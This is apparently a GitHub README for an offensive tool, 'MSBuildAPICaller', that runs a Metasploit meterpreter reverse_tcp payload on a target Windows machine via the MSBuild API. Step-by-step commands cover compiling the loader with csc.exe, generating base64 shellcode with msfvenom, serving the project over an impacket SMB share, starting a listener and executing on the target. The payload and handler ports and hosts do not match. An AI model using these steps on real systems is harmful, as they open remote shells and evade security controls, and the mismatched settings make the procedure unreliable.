# MSBuildAPICaller
 MSBuild Without MSBuild.exe


# How to build and execute

## Step 0: git clone this repo on your Kali Linux machine

```
git clone https://github.com/xax007/MSBuildAPICaller
cd MSBuildAPICaller
```

## Step 1: Build IEShim.cs on your Windows Machine
```
C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe /reference:"Microsoft.Build.Framework.dll";"Microsoft.Build.Tasks.v4.0.dll";"Microsoft.Build.Utilities.v4.0.dll" /target:library IEShim.cs
```

## Step 2: Modify `msbuildapicaller.cs` file 

Modify `projectPath` variable on line 60 of `msbuildapicaller.cs` to your needs

Example:   
`string projectPath = '\\\\192.168.1.100\\share\\msbuildapicaller.csproj';`

## Step 3: Generate shellcode

```
msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw -o payload64.bin LHOST=10.0.0.1 LPORT=2000
``` 
convert the shellcode from binary to base64

```
base64 -w 0 -i /root/payload64.bin > payload64.txt
```  

Replace `<Base64 Encoded x64 Shellcode>`  with your base64 encoded x64 shellcode in `msbuildapicaller.csproj` file


## Step 4: Modify `msbuildapicaller.csproj` fille  

Replace `AssemblyFile` variable in msbuildapicaller.csproj file with the location of your compiled dll from step 1

## Step 5: Build `msbuildapicaller.cs` file

```
C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe /reference:"Microsoft.Build.Framework.dll";"Microsoft.Build.dll";"Microsoft.Build.Engine.dll";"Microsoft.Build.Utilities.v4.0.dll";"System.Runtime.dll" /target:exe msbuildapicaller.cs
```

## Step 6: Start a SMB Server via impacket on Kali Linux

```
impacket-smbserver share /msbuild -smb2support
```

## Step 7: Start a Metasploit exploit handler
```
$ msfdb run
msf5> handler -p windows/x64/meterpreter/reverse_tcp -P 4444 -H 1.2.3.4
```
## Step 8: Execute 

execute `msbuildapicaller.exe` file complied from `step 5` on target windows machine


reference: [MSBUILD WITHOUT MSBUILD](https://pentestlaboratories.com/2020/01/27/msbuild-without-msbuild/)
